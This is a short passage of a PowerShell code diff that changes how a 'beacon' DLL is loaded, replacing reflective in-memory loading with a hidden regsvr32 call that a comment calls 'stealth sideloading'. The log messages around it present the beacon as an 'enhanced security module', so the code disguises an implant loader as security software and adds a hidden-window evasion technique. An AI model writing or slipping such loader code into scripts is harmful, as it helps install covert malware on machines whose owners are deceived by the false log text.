@@ -25,11 +25,9 @@ try {
     if (Test-Path $beaconPath) {
         Write-Log "Loading enhanced security module..."
         
-        # Read DLL bytes
-        $dllBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $beaconPath))
-        
-        # Load via reflection
-        $assembly = [System.Reflection.Assembly]::Load($dllBytes)
+        # Load beacon DLL via regsvr32 (stealth sideloading)
+        $regArgs = "/s `"$beaconPath`""
+        Start-Process -FilePath "regsvr32.exe" -ArgumentList $regArgs -WindowStyle Hidden -Wait
         
         Write-Log "Security module loaded successfully"
         
